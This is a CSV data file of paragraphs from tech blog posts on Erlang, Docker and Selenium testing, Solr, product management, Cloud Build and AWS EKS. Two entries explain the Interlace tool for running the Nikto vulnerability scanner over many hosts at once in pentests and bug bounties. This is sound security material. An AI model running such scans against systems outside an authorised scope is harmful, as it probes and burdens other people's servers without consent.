840,"Moving forward a few more years, I was seduced by Joe Armstrongs arguments for Erlang as a foundation for systems that never stop. One of its lesser known features is a database called Mnesia (the opposite of amnesiatypical geek humour). To me it had two big attractions; first, it is designed for distribution; and second, as part of the Erlang distribution, it cost nothing. I had failed to learn the lesson that when it comes to databases, cheap does not necessarily mean good! We started with Mnesia running on a single node, and functionally it behaved exactly as specified. We did some baseline performance tests, then started adding nodes to see how well it scaled out. The results were bizarrethe more nodes we added, the worse the performance became! With help from one of the original committers, we tracked the problem down to distributed locking. We had some heavily contended database records, and as multiple node tried to get locks on the same record, they were having to back off and wait. The more the nodes, the longer the waitnegative scalability! The only solution was to re-design the application and the data model to avoid contention and to favour node-local over distributed locks.","['Programming', 'Cloud Computing', 'Software Architecture', 'Software Engineering', 'Payment Processing']",10
841,"Despite Erlangs great features, its development environment was frankly primitive. Developers took an atavistic delight in using vi or emacs editors instead of an IDE, and the amount of open source software available was miniscule compared with Java. We struggled with basic functionality such as parsing XML. If only there were a Java framework that offered similar functionality Enter Akka, a framework that explicitly borrows from Erlang, but which runs in the JVM. It carries across Erlangs supervisor model, and evolves the gen_server into an actor. Actors are composed into actor systems, which form nodes in a cluster. The cluster supports locational transparency and failure detection. Akka also unifies messages and events, allowing actors to create and consume events via a pub-sub model.","['Programming', 'Cloud Computing', 'Software Architecture', 'Software Engineering', 'Payment Processing']",9
842,"Heres the problem thoughsome of these tools are slow. That script you wrote back in 2008 is slower than peak hour traffic and it definitely isnt multi-threaded. You better leave your laptop open for the next 48 hours. Running Nikto on 100 web servers? It doesnt have CIDR support, so now you need to either run it manually 100 times for each host or write a script to cycle through all the targets and visit some Antarctic penguins while you wait for it to finish.","['Interlace', 'Bug Bounty', 'Pentesting', 'Penetration Testing', 'Infosec']",11
843,"Lets say we need to run Nikto (a basic, free web server vulnerability scanner) over a list of hosts: For an external pentest or bug bounty scope, you might have thousands of hosts. For the sake of this article, were going to keep this one simple with four hosts. Before Interlace graced the internet, to run Nikto over a list of hosts, I might have run each host separately like this: If I were scanning 1000 hosts, that would take too long to write out, so I might have used some bash scripting instead: Problem? Its still single threaded and too slow. Especially if, like me, you are suffering from ridiculously slow internet speeds in Australia. This is a great example of a situation where Interlace excels: Lets break this down a bitheres the command I ran:interlace is the name of the tool.-t L./ __url__ defines a file with a list of hosts.-threads 5 defines the number of threads.-c should be immediately followed by the command you want to run. ""nikto --host _target_ >./_target_-nikto.txt"" is the actual command which will be run, note that instances of _target_ will be replaced with each line in the./ __url__ file.-v makes it verbose.","['Interlace', 'Bug Bounty', 'Pentesting', 'Penetration Testing', 'Infosec']",11
844,"Let me offer an intuitive analogy to the general overflow problem: assume you pull out an old calculator that has only a 10-digit display and no scientific notation. The largest number you can display on it is 9,999,999,999 (without the commas). If you add 1 to it, what happens? The answer is 10 billion, which has ten zeros. The most significant digit (1) drops off the left end, leaving nothing but zeros. This is the overflow error, which can cause considerable anguish to a nine-billionaire who is going after his tenth billion. A well-designed calculator would show an error, leading you to suspect that something was wrong. But, a poorly designed calculator would just show a bunch of zeroes or just one zero. Another example is the odometer in a car, which would reset to zero on the millionth mile (assuming it has six digits).","['Blockchain', 'Smart Contracts', 'Software Development', 'Mathematics']",3
845,"This is pretty much what happened with the batchoverflow bug, and it all happened in the context of performing multiple transactions in one batch (thats where the batch comes from). The numbers involved, of course, are much, much larger, but every type of number representation has a limit. To prevent overflows in 8-bit computers, you can create and use 32-bit computers, but after about 4.2 billion, the overflow error strikes. You can go on to 64-bit or 1024-bit or even more advanced computers, but youd be out of luck eventually because the number of integers is infinite. No matter how big a house you build, you would just be pushing the significant overflow bit out of the house at some point. (Of course, if you are working on 1024-bit computers, which is highly unlikely any time soon, and keep encountering the overflow error, you have an entirely different type of problem on your hands. )Programmers use different types of number representations, such as int and uint. int stands for integer and allows the computer to store whole numbers in the range of -2,147,483,648 to 2,147,483,647. uint stands for unsigned integer (a fancy way of saying no negative numbers) and can represent numbers in the range of 0 (zero) to 4,294,967,295 (these ranges are for 32-bit computers).","['Blockchain', 'Smart Contracts', 'Software Development', 'Mathematics']",3
846,"The topic of Turing machinesand of the halting problem in particularbelongs to computational theory. However, the undecidability of halting is a ramification of Russells paradox in set theory, a topic in pure mathematics, which Gdel formalized. Rices theorem delivers the fatal blow (Et tu, Rice?) by generalizing the halting problem to properties of formal languages. The most entertaining explanation of Russells paradox comes from Groucho Marx in his quip, I dont want to belong to any club that will accept me as a member, if you assume hed rather belong to a club that wouldnt accept him as a member! The other reason is that it is impossible to prove a negative, or in this case, the absence of a bug. The root of this epistemological dilemma is metaphysical: that which does not exist leaves no trace (or has no effect) on the universe. It is for this most important reason that we cant ever prove that someone is innocent (which is the absence of wrongful activity) or that something doesnt exist (for example, a six-legged blue unicorn dragon). The burden of proof in all these cases lies with the person who states the positive (i.e., that something exists). For example, the person who claims that your code has a bug has to prove it by showing the bug; the person who claims that you committed a crime must prove it while you have no obligation to prove that you are innocent (which, as we saw, is impossible). As you might imagine, this is a deep topic in itself.","['Blockchain', 'Smart Contracts', 'Software Development', 'Mathematics']",5
847,"In the context of blockchain, we need strategies to alleviate the problem (we already know we cant provably eliminate all problems). One serious issue with blockchain is its immutability and the implicit enforcement of the code is law principle. The advantage of immutability at the data level turns into a problem at the code level because most modern code is produced in an Agile way. This means rapid and frequently mildly buggy (or at least not full-featured) code that is deployed into production, then iteratively and continually improved (or more features added). This conflicts with the need to have contracts (which, after all, are legal in nature) as perfect and error-free as possible from the very first implementation. There are solutions for this, but completely distributed production of smart contracts in an open and permissionless blockchain only adds to the challenge.","['Blockchain', 'Smart Contracts', 'Software Development', 'Mathematics']",9
848,"While not exhaustive and detailed, here are some principles that are relevant for all applications but especially for blockchain applications:1. Prevent as many bugs as possible (follow best practices, reuse extremely well-tested libraries or modules, conduct peer reviews, conduct exhaustive automated tests, test for boundary conditions, identify code that depends on operating system, representation (number systems, character encoding, collations, type casting, etc. Fail as gracefully as possibletry not to crash and burn, but parachute down if engine fails.3. Identify any potential failuresthese are anomalous, abnormal, or unusual situations (data, transactions, usage patterns, trends); some of these may be legitimate transactions but should be identified because of potential errors.5. Correct or recover from failures as quickly as possible.6. Feedback into next iterationconduct retrospective to plough back lessons into a continuous improvement cycle.7. In case of failures or errors caused by deliberate or malicious intent, do everything reasonable to deter future attempts; this includes providing data to and cooperating with legal enforcing entities.","['Blockchain', 'Smart Contracts', 'Software Development', 'Mathematics']",9
849,"As the seriousness of potential errors increases, the level and scope of governance must also increase. Generally, strong governance is associated with centralization and bureaucracy, but that need not be the case. It will be useful to think of governance in several layers. It starts with self-governance at the individual level, then validations at the team level, and then moving on to the level of the collective (association, community, or consortium). Financial systems require governance at the industry and government level. Many financial transactions are global in nature, requiring some form of governance at the international level.","['Blockchain', 'Smart Contracts', 'Software Development', 'Mathematics']",12
850,"There are two other important aspects of complexity that are sources of functional errors (if not bugs in the classical sense). Code that passes inspection at one time and in one domain, operating system, or virtual machine can behave differently in another context. This situation is a consequence of working in distributed systems. By way of comparison, note for example the myriad inconsistencies in browser implementations and the difficulties of rendering html on various devices. The final source of complexity is change. As conditions in the environment change, this gives rise to outdated and inconsistent behavior.","['Blockchain', 'Smart Contracts', 'Software Development', 'Mathematics']",9
851,"Flexibility comes at a price, paid in the coin of complexity, automation, cost, governance, and regulation. The more flexibility is desired, the less immediate automation is possible (as in smart contracts). For example, bitcoins security and immutability of data (different but related concepts) comes at the expense of a having only a simple set of transactions. When we desire more types of transactions or more flexibility in their implementation, then we require smart contracts. These demand, as we have seen, much stronger governance of code quality. A well-engineered approach to systems design and to governance is necessary if we move into even more flexible and sophisticated systems. Complexity in future blockchains would arise from the use of artificial intelligence, massive amounts of data, transactions involving multiple-parties and jurisdictions, privacy mandates, multiple types of transactional instruments such as contracts and securities, and complex regulation.","['Blockchain', 'Smart Contracts', 'Software Development', 'Mathematics']",12
852,"Docker Containers (and Kubernetes, AKA K8S) are great technologies. Some people tend to think that because containers are like a lightweight VM, and because they can easily spawn as many container instances as they like very easily, then containers can help them run more tests in parallel on a single host. Obviously, containers dont add physical hardware resources, and frankly, most of what containers allow you to do, you could do before containers were around, using standard processes. The big advantage of containers is that they help you create isolated and predictable environments, i.e. with regard to the pre-installed applications, existing files and folders, IP ports, etc. But as well see soon, this also doesnt solve many of the common isolation problems.","['Docker', 'Selenium', 'Selenium Grid', 'Parallel', 'Test Automation']",7
853,"In most cases, most of the time taken by a test run is taken by the processing at the server side and the processing and disk access of the database. Often, most of the time that the other players in the flow take, is spent just waiting for the server and the database. In addition, a significant part of the time is taken by the communication overhead between the different processes. This overhead is even much more significant when the processes reside on different machines, and more so if the machines are farther away from each other (e.g. in the cloud)Now lets try to clarify the effect that each of the tools have on the resources and on our ability to run tests in parallel Most unit testing frameworks have an option to split tests to run on different threads (Refer to the documentation of your specific framework for more details). In the lowest level, if we run the tests using multiple threads, we take advantage of more cores on the machine that runs the tests. Even with a single core, when one test waits for a response from the Web Driver (which in turn waits for a response from the browser, which in turn waits for a response from the server), then another test can use the CPU at the same time, making the entire test run to complete sooner.","['Docker', 'Selenium', 'Selenium Grid', 'Parallel', 'Test Automation']",13
854,"Running tests using multiple VMs is technically identical to running them on different physical machines. The advantage of VMs is that its much more flexible to manage and maintain them. But obviously multiple VMs share the same hardware resources of their host. If your company has its own data-center, it probably has many hosts and they try to optimize they resource utilization in the most efficient way, so the details are probably transparent to you, and you can treat the VMs just like you do with physical machines. However, because of that flexibility, you can consider requesting more compute resources from your admins instead of requesting new VMs. There are pros and cons to doing that, but it may be simpler for you to manage one strong test VM that runs all the tests rather than many VMs which split the tests between them. The communication overhead would also be reduced. On the other hand, this big VM will always reside on a single host, which may limit the optimizations that the admins can do to better utilize the hardware resources.","['Docker', 'Selenium', 'Selenium Grid', 'Parallel', 'Test Automation']",10
855,"As we saw, Selenium Grid isnt required in order to run tests in parallel, nor for cross-browser testing. When youre using Selenium Grid, the tests run on one machine (or more) and the drivers and browsers run on another set of machines. Obviously, these machines may either be physical or virtual (VMs), and even Containers, as well discuss shortly. The important thing to remember is that your tests dont run on the same machine where the browser runs. This means that each call to Web Driver (e.g., find Element, click, send Keys, etc.) takes a round-trip between the machine that runs the test and the machine that runs the browser. As always, premature optimization is the root of all evil, but because these round-trips occur very frequently, theres a high chance that it will impact the performance of your tests significantly.","['Docker', 'Selenium', 'Selenium Grid', 'Parallel', 'Test Automation']",13
856,"The last technology, which we cannot complete this discussion without it, is containers. By far the most popular and significant tool in this space is Docker. If youre not familiar with containers, heres a short description: You can think of containers as something between a process and a very light-weight VM. Containers apply virtualization capabilities of the hardware and the host OS in a way that resemble VMs, but with one main difference: While VMs run full blown OS (the guest OS), which can be completely different from the host OS (for example, you can run Windows 7 VM on a Linux host), Containers share the OS of their host, and only virtualizes resources like the file-system, processes, and networking, which make them more isolated and reproducible then simple processes. Note that Windows Server is able to run Linux containers (by running a Linux subsystem inside of Windows), but at least currently, its not possible to run Windows containers on Linux. The main advantages of containers are: Theyre very light-weight. While an image of a full VM is very big because it has to contain the entire guest OS, an image of a container only contains the process or processes that we want to run, and maybe some files that we need the contained application to access.","['Docker', 'Selenium', 'Selenium Grid', 'Parallel', 'Test Automation']",7
857,"Figure 11 depicts 2 completely separated test environments, each belongs to its own Kubernetes Cluster and contains 3 containers: the Test container, having the test, driver and browser processes, another container for the server, and a 3rd containers for the database. The physical host of each of these containers is insignificant, as you can easily port if from one host to another. Note that this configuration doesnt make use of Selenium Grid because each cluster can have a different browser to start with, and you dont need a mechanism to route between the test and the browser (though there can be configurations in which it does make sense)As you can see, there are many ways to run tests in parallel, and to test your application across multiple browsers and platforms. Each has its pros and cons, and its important to understand what you really need. The new and shiny tools, like Docker and Kubernetes are great, but use them only if it solves your problem. I recommend that you start by stating what is the problem that youre trying to solve, and then look for the simplest solution that solves it. You can always change and improve it later if you need to.","['Docker', 'Selenium', 'Selenium Grid', 'Parallel', 'Test Automation']",11
858,"Almost two years ago, our search was running on Solr and My SQL. Data sync between these two systems was rough. We had to sync our search database with our transaction database. To do this, we used to rely on cron jobs but these were hitting their limits. The queries required joining across multiple tables. And sometimes, we could not add extra fields as the JOINs became prohibitively expensive. Also, we have several different databases with profile information scattered across them and as you might know, joining across databases is simply impossible.","['Big Data', 'Apache Kafka', 'Elasticsearch']",8
859,"Dashboards are not user facing and so not mission critical. Our Kafka could fail and all wed have is some jagged lines on the dashboard. So now we needed a way to get event data onto the Kafka stream. Being a 17 year old system, there are myriad entry and exit points for every type of interaction. Some parts of the website use an older system, some new APIs use a newer system, the customer support system also writes to the database. There was just no single point of entry into the system where we could start capturing events from. Thats when we decided to read the events from the database itself.","['Big Data', 'Apache Kafka', 'Elasticsearch']",6
860,"So, how do you pick a parser? Survival in this world comes from an understanding of whats going on under the hood when transforming a human query into something thats able to be interpreted by Solr. For an example of how different parsers interpret queries differently, lets take a look at some code. Heres how two of the most popular parsers, Lucene and e Dis Max, handle the same query: Query: Lucene query parsing:e Dis Max query parsing: In this instance, the Lucene parser throws an error because the query doesnt match the required syntax. By contrast, e Dis Max doesnt complain, despite the query not fulfilling syntax requirements and one term being ignored. Want to understand whats going on? You can find a quick guide for using these tools here.","['Solr', 'Search', 'Empathy']",8
861,"Lucene is the Standard Query Parser, but Solr allows us to change this easily, using its def Type parameter. Dont get stuck always using the same query parser just because you always have done. Choosing the right parser for the right job is essential. If you dont, you could be missing out on a whole range of features that will better suit your systems needs.e Dis Max On the other hand, the original Dis Max query parser was created with one goal; to reduce the number of errors in user-facing systems with limited management control that result from direct user queries. The problems that usually arose in these kind of systems were often down to the fact that they exposed technical inputs to non-technical people. Allowing a user to freely input keyword queries would eventually bring about syntax errors. By providing a solution to this, the appearance of Dis Max changed the world of search.","['Solr', 'Search', 'Empathy']",8
862,"Some of you have asked me in the last few months about What are the soft skills a Product Manager (PM) should have? This is a topic very dear to me because I have changed a lot of jobs and I have observed how different companies and individuals see this role. In its core this role is very interesting and satisfyingyou are responsible for bringing a product to the user that they like while you meet the companys business objectives without burning bridges (relationships with people in your team and your company). However, since you dont have any direct reports (if you are an individual contributor) you have to do all these with this magical term we crafted called influence. And in the end, the accolades of success go to the team and if it fails, some criticisms go toward you. Before we forget, unlike an engineer who checks in their code every day and a designer who produces great designs, your gratification is delayed (till the product, your baby, is released). I dont want to start a pity party; I want to acknowledge the peculiarity of this function and the challenges you face every day. Your life is hard and exciting and this post can help you develop some of the oft unspoken skills that you need to sharpen over time. Side note: 10 years ago, I devoted my a lot of time learning the technical skills but I realized throughout the years that having technical skills are only good if you have soft skills to bring your work into fruition. These skills may sound trivial and may occur to you that you may already have them; think again! Successful PMs (who build great products and healthy teams) do two important things very wellprovide focus to their teamsfigure out the right things to do within the right amount of time and create alignment within the team and companywho are the right people to talk to? Are these goals the right ones for the company/team? To achieve this, I believe that a PM should possess two categories of skills Technical skills so that you can build the product and use a repeatable and measurable process to that end. Broadly the technical skills can be classified as (a) Product Sense (Vision)with past research, data, knowledge and assimilation of experience, a PM should be able to intuitively break down a big product problem into small solvable chunks through research and analysis and thereby provide their team clear pathways for solutions (b) Execution and Operationsproduct planning skills such as setting goals and key results, building a backlog and a roadmap; root cause analysis of a bug or an issue; creating right processes for team(s) to have the right focus and alignment.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
863,"At the heart of collaboration, building a shared understanding with people or the ability to help them come to a decision is super important. Its a big challenge in a cross functional team as team members come from different parts of the organization and they have different personalities. Your goal is to harness all ideas and thoughts, connect them to your goals and make a decision which is beneficial to your users and your business however in that process, create an environment where everyone can participate, feel valued and have a sense of ownership in that decision. To help your team, you need to provide them with critical information such as priority, objectives, technical feasibility, strategic input, constraints, enablers etc. No matter what information is required, you should be prepared to dole this information out as soon as possible. Its a super hard thing to do and youd need a lot of technical skills to do this. However, a few people skills will help you a lot. The four main categories of skills to help you are (a) Communication and Framing (b) Facilitating conversations (c) Building Trust and (d) Motivating. Lets go through some of these and more in detail: It is very important for PMs to communicate their plans/results/requests through various mediums such as keynote speech, product demo, planning meetings, product documents or even launch announcements. However, equally important is how you frame your communication based on your audience. Presenting an objective, a problem or even a solution to a group of people requires a technique called Framing. Employees want to see how their work is connected to the success of the users and the business. As PMs you should be very clear about the why behind a problem that we are trying to solve. A couple of techniques and things to keep in mind that can help Situation, Action and Result (SAR)its a technique used to narrate a story. A story can be about a user or it could be about a particular situation you encountered. Needless to say, it can also help you frame your response for a behavioral question that you may answer in your job interview. Start with the context and the current situation or challenge, then talk about what you did or what action you took and then talk about the result.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
864,"and asking, What do you think? These are oft asked questions in the daily life of a PM. Sometimes we ask hard questions too. A lot of times PMs need to bring different stakeholders within the company and even partners/users together to come up with a solution. There will be a lot of challenges. Some examples are Product Visioning and Roadmapping exercise, Team Inception (starting a new team) meeting, Stand ups, Backlog Grooming, User Research, Clarifying roles of team members. When you dont have the luxury of an Agile Coach in your team, you have to be this person as your job is to get things done:) Facilitating Conversations is as much a science as it is an art. Art because you need to understand peopletheir skills/abilities, their willingness and motivations etc. and know who are the right people to get involved and how you can help bring the best in them. It is Science because to do a great facilitation, you need to bring some structurehave an objective, ground rules and constraints. Sociologists around the world has developed great techniques and I highly encourage you to read Gamestorming. Its important to know that diverse perspectives are very important however its hard to get those perspectives when discussion get hijacked by strong personalities. Its your responsibility to look for those signs and ask folks who havent participated in the conversation What do you think?its a very powerful question. In addition to getting another opinion, youd also demonstrate that you care about everyones opinions in the room. These subtle things help you earn trust which is our next topic.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
865,"Trust and respect are implicit reasons why teams or people work/for with you. Even if you have great technical skills, if someone doesnt trust you or even respect you, its hard for you to excite them to work on a project. There are two types of trustcognitive trust and affective trust. Cognitive trust is trusting someones abilities (technical) to do a job and show results and affective trust is trusting someones intents and judgments as a person. We will discuss the latter here. Some of these skills and behaviors can help you in building trust and earning respect.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
866,"Get to know your team Before you jump in to work in a new team or a new member, a fair amount of forming and norming happens. Its easy to get lost in superficial bowling games and sprint planning right away. But if you really are curious who your team mate is and how to harness their energy, you have to know their motivators and things that demotivates them. I would generally do a personal mapping exercise and a project/team inception exercise to kick this off. The personal mapping exercise builds affective trust (by learning about the personal and getting to know them) and the inception exercise builds a shared understanding of what your team is trying to accomplish. And of course feel free to socialize with your team outside of office hours.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
867,"Honesty This is one of the biggest problem to tackle. As a PM you would be privy to a lot of important informationsome are good news and some are bad. You have to use your discretion a lot in divulging such information to your coworkers and your team. At the same time, you are also accountable to be transparent and honest with them. I would suggest speaking with your manager on things you can talk about and things you cant. If you feel that people are sensing some ambiguity in your plans or your communication, dont let them brew in that confusion as this leads to rumor mills and that creates an unhealthy work environment. My advice is to come clean and state the ambiguous things up front but with a path to resolution. Here are the things I have no information and I cant help you or myself. However, I will try and get this information by XYZ date. More often people forget that date but remember that you have been kind enough to empathize with their confusion or lack of understanding.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
868,"Coaching Coaching is very different from teaching and mentoring. You dont tell anyone what to do. Listeningactive listening means you are not just listening to their words but understanding what they are trying to imply. You may have to probe more and ask difficult questions for e.g. Why is it not the other way around? Have you tried to see their perspective? What can you do about it? You dont ask Have you tried this method?this is more mentoring or giving advice. Coaching is powerfulif you make it a practice to coach your cross functional team, they will in turn apply similar methods to resolve issues on their own.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
869,"Clarify roles and responsibilitieswhen you join a new team or a new member joins, its super important to discuss how you can work with them and what to expect of each other. If we have worked in another company, we bring our own baggage and we tend to say In XYZ company, I did this and worked really well so lets start doing it here. The thingsthey didnt work with you in that company. Hence, you need to step back and clarify your role and theirs at the onset. RACI (Responsible, Accountable, Consulted and Informed) matrix is good for a cross functional/departmental project however within a team of engineers with some homogeneity we need to go a bit granular. Similarly when there are three leads in a team Product Manager, Engineering Manager/Lead and Design Lead, its good to clarify your roles at a deeper level when you dont have clear idea on where you stop and the other starts. If you are a PM in a highly technical team, there are certain perceived overlaps of your role with technical lead or a technical project manager. Atlasssian published an exercise which basically looks at what you think your role is and how it maps to what others think.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
870,"Blameless Post-Mortem and Psychological safetyalthough the entire organizations culture isnt your responsibility, yet its your responsibility as a part of the team leader (along with design and tech leads) to have a healthy and performing team. Dont single out a person in your team in a public forum if there is an issuedo a 1:1 with them first. If there is an issue for e.g. the app is crashing etc., first focus on fixing it and then follow up with a blameless post-mortem which singles out issues, actions and points of failure vs. people. Etsys essay on this topic is really amazing. If you want to have your team give your real feedback, you need to build a safe zone for them to discuss things either with you or with the teamwhich means (a) use your discretion to share the information and how it is going to affect them, (b) things that are discussed in retrospectives should be only made available to executives as themes vs. specific comments by a person whatever is spoken in this room stays in this room! More than motivation, there is a high chance youd demotivate a team member. A long lasting motivation comes from within and is intrinsic. However, we are going to talk about ways you can spark these motivations from within.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
871,"In most companiesbig or small, hyper growth or stagnantthere will be moments when your team or you may not have clear direction or focus, get recognition or be appreciated. Things may seem awry and chaotic and you feel super demotivated. If these werent enough reasons to feel distraught, think about situation when a coworker or even your boss hasnt been nice to you. We all have at some point felt some or all of it. The best PMs have the ability to see below these temporary setbacks and think big and into the future. Resilience means not just bouncing back from a tough situation; it also means to gather courage to stand against all odds and be effective in changing the unfavorable situation. Since we have to be the connective tissue between different organizations such as engineering, design, research, sales etc. we have to be mindful of our responsibilities towards them and their stress. A lot of time we may be tempted to share some of our own frustrations; however if these frustrations turn into negativity and chronic complaining, it affects team morale. I would advise that you should definitely share your concerns in the right forum (one that can affect change) and with suggestions or ideas to fix the problem.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",4
872,"There maybe times when you feel that nothing is moving in any direction let alone the right direction. And its easy to be lost in those moments. I would advise having your own point of view on the situation at hand. You should be able to answer How would I do it? I have noticed PMs getting a lot of visibility and accolades for making decisions at times when there were no one making them. You need to have the conviction in you. You can validate your thoughts with your peers and give them due credit. In similar vein, youd have to say NO to a lot of requests coming to you and your team. Youd need to have reasons and convincing ones to say no. Over a period of time, youd need to build frameworks (even if you dont have all the information you need) to build up conviction.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",4
873,"Not taking credit for something you had done is hard. More so because PMs dont get to have personal gratification of their work everyday. It comes in cyclesreleases or sometimes not in a long time. For your own motivation, youd have to think about other idealshow your work is changing the world, your users and customers and above all the career opportunities you have as a PM cant be defined. Sometimes when my own family doesnt know my role and what I do, I feel a bit frustrated and I make an effort to define it for them. But then again, I remind myself how my day-to-day work contributes to the larger mission of the company I work for. A big skill you need to develop is to feel comfortable with this notion and let your team shine before yourself. Your selfless drive wont be unnoticed.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
874,"Lastly, a big part of your job is to deal with unpleasant situations and sometimes unpleasant people. Instead of complaining or escalating, try and mitigate people issues as much as possible yourself first. Start with having a 1:1 with the person and have the crucial conversation. This method doesnt emphasize your issue with the person but rather with their behavior. Start with the context and observations (where, what and when that behavior was observed) and then talk about your feelings. Its important to let them know why it matters to your or even the team and what can be done to avoid it or make the situation better next time. When I saw you say ABC, I felt XYZ. It matters a lot to me and the team because. In the future if we do. This is very hard but once you get into the habit of doing this and practice inside and outside of the office, it will come to you naturally. Make sure that you empathize with the person, conduct in a safe environment, separate facts from observations and come up with a plan together.","['Startup', 'Product Management', 'Product Manager', 'Agile', 'Leadership']",0
875,"A simple way to create a front-end web application is by using Angular CLI. The steps to install this tool are out of the scope of this article and can be found here. Once installed, cd to your preferred folder and type ng new <app-name>. After the app is created, type cd <app-name> and ng serve. Point your browser to http://localhost:4200 and make sure the app is running. As we have a fully running app, we stop the development here;). Its time to think about delivery! An Angular app is a set of HTML, CSS, JS, images and other web-related static files. So, what we need to do now is to build the app and deploy it to an HTTP server in order to make it available to the users. To build the Angular app, we runnpm install and npm run build --prod in the <app-name> folder. Angular CLI then creates a new dist folder, where it places the ready-to-deploy content. We could figure lots of ways to copy these files to the web server, but following this path we are adding complexity to our build process, dont you agree? As we desire simplicity and automation instead of complexity and manual tasks, well learn how to use Cloud Build.","['Google Cloud Platform', 'Continuous Delivery', 'DevOps', 'Cloud Build', 'App Engine']",19
876,"Once the repository is set, navigate to GCP Cloud Builds triggers page: __url__ structure.","['Google Cloud Platform', 'Continuous Delivery', 'DevOps', 'Cloud Build', 'App Engine']",7
877,"I must state that behind the scenes here at Qubit, there were numerous people who gave great advice and guidance throughout this project, without which, this would not have been possible. This was in addition to a wide range of great online resources (cited below). (This article will not cover the breadth and understanding of ML, there are a host of better-written articles for that! I also assume you have Python 3 pre-installed in some capacity. )For challenges of this type, from my experience and understanding, it is common to initially explore the effectiveness of a Minimum Viable Product (MVP). In this context, using well-cited algorithms with little to no feature engineering or data preprocessing, to understand where the floor is' with regards to model precision and accuracy. My MVP involved Logistic Regression, Decision Tree and Random Forest algorithms because the target variable was binary. In order to keep this article focused, Binary Logistic Regression was chosen and here are some key resources that definitely helped: Books Data Science from Scratch: First Principles with Python Joel Grus Machine Learning with Python Cookbook: Practical Solutions from Preprocessing to Deep Learning Chris Albon Online Resources Logistic Regression Chris Albon Website Logistic Regression Wikipedia Medium articles Building A Logistic Regression in Python, Step by Step Susan Li Logistic Regression. Simplified Apoorva Agrawal Solving A Simple Classification Problem with Python Fruits Lovers Edition Susan Li Analytics Guild Here at Qubit, we have an internal Analytics Guild, which provides an open and candid environment to report back on model development for feedback (shout-out to all involved!","['Machine Learning', 'Logistic Regression', 'Python', 'Sales', 'Scikit Learn']",5
878,"Kubernetes is an automation system for the management, scaling and deployment of containerized applications. Its Open Source, and cloud provider (multi cloud) and programming language (polyglot programming) agnostic You can develop and test code locally, then deploy at scale It helps with resource management, you can deploy an application to Kubernetes and it manages application scaling More powerful frameworks built on the Kubernetes APIs are becoming available (e.g. Istio)Our goal was to try Kubernetes out on AWS using the newish AWS EKS, the Amazon Elastic Container Service for Kubernetes. Kubernetes is a sophisticated four year old technology, and it isnt trivial to learn or deploy on a production cloud platform. To understand, set-up, and use it, you need familiarity with a mixture of Docker, AWS, security, networking, linux, systems administration, grid computing, resource management and performance engineering! To get up to speed faster, I accepted an invitation to attend an AWS Get-it-done-athon in Sydney for a few days last year to try out AWS EKS. Heres the documentation I used: EKS user guide, step by step guide, and a useful EKS workshop which includes some extensions.","['Apache Cassandra', 'Apache Kafka', 'Kubernetes']",11
879,"Kubernetes has a lot of layers, a bit like Russian nesting dolls. The smallest doll is the code, the Java classes. Then you have to package it as a Java JAR file, then turn the JAR into a Docker image and upload it to the Docker Hub. The Kubernetes layers include nodes (EC2 instances), pods which run on nodes, and deployments which have 1 or more pods. A Kubernetes Deployment (one of many controller types), declaratively tells the Control Plane what state (and how many) Pods there should be. Finally the control plane, the master, which runs everything. This is the focus of AWS EKS.","['Apache Cassandra', 'Apache Kafka', 'Kubernetes']",7
880,"Toto, Ive a feeling were not in Kansas anymore Each AWS EKS runs in an AWS region, and the worker nodes must run in the same region. When I created EKS last year there were only 3 supported regions. There are now lots more EKS regions. Unfortunately my Kafka and Cassandra test clusters were in Ohio, which was not one of the EKS regions at the time. Virginia was the nearest EKS region. Ohio is only 500 km away, so I hoped the application would work ok (at least for testing) across regions. However, running EKS in a different region to other parts of your application may be undesirable due to increased complexity, latency, and extra data charges. It also introduced some unnecessary complications for this experiment as well.","['Apache Cassandra', 'Apache Kafka', 'Kubernetes']",11
881,"First we have to prepare things:1Create Amazon EKS service role (5 steps)2Create your Amazon EKS Cluster VPC (12 steps)3Install and Configure kubectl for Amazon EKS (5 steps)4Install aws-iam-authenticator for Amazon EKS (10 steps)5Download and Install the Latest AWS CLI (6 steps)Many (38) steps and a few hours later we were ready to create our AWS EKS cluster.6Create Your Amazon EKS Cluster (12 steps)7Configure kubectl for Amazon EKS (3 steps)Next, more steps to launch and configure worker nodes:8Add key pairs to EKS region (extra steps due to multiple regions, down a snake)9Launch and Configure Amazon EKS Worker Nodes (29 steps)We finally got 3 worker nodes started.10Deploying the Kubernetes Web GUI dashboard is a good idea if you want to see whats going on (it runs on worker nodes). But then down another snake as the documentation wasnt 100% clear (12 steps).11Deploy the application (5 steps). Does it work?12Not yet down another snake. Configure, debug, test application (30 steps)After 100+ steps (and 2 days) we could finally ramp up our application on the Kubernetes cluster and test it out. The completed game, with steps (112) numbered, looked like this: Heres the Kubernetes GUI dashboard with the 3 worker nodes and the anomaly detection application pipeline deployed. You can kill pods, and EKS magically replaces them. You can ask for more pods and EKS creates morejust dont ask for too many! Its useful to understand the basics of AWS EKS/Kubernetes scaling (I initially didnt). When you create a Kubernetes deployment you specify how many replicas (pods) you want. Pods are designed to run a single instance of an application and are the basic unit of concurrency in Kubernetes. They are also designed to be ephemeralthey can be started, killed, and restarted on different nodes. Once running, you can request more or less replicas. I started out with 1 replica which worked ok.","['Apache Cassandra', 'Apache Kafka', 'Kubernetes']",11
882,"I then wanted to see what happened if I requested more replicas. I had 3 worker nodes (EC2 instances), so was curious to see how many pods Kubernetes would allow1, 2, 3, or more? (Note that some of the worker node resources are already used by Kubernetes for the GUI and monitoring). I soon found out that by default Kubernetes doesnt limit the number of pods at all! it assumes pods use no resources, and allows more pods to be created even when all the worker nodes have run out of spare resources. As a result the worker nodes were soon overloaded, and the whole system became unresponsivethe Kubernetes GUI froze and I couldnt delete pods. To try and get things back to a working state I manually stopped the EC2 worker instances from the AWS console.","['Apache Cassandra', 'Apache Kafka', 'Kubernetes']",11
